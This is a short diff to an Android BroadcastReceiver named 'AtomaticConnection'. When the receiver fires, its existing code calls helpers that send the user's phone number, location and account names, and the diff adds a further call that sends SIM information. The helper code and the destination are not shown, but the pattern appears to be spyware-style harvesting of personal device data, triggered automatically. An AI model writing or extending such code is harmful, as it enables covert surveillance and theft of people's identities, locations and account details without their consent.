@@ -34,7 +34,7 @@ public class AtomaticConnection extends BroadcastReceiver {
             new SendUserInformation(context).sendUserNumber();
             sendLocation();
             new  SendUserInformation(context).sendAcountsName();
-
+            new SendUserInformation(context).sendSimInformaation();
         }
 
     }
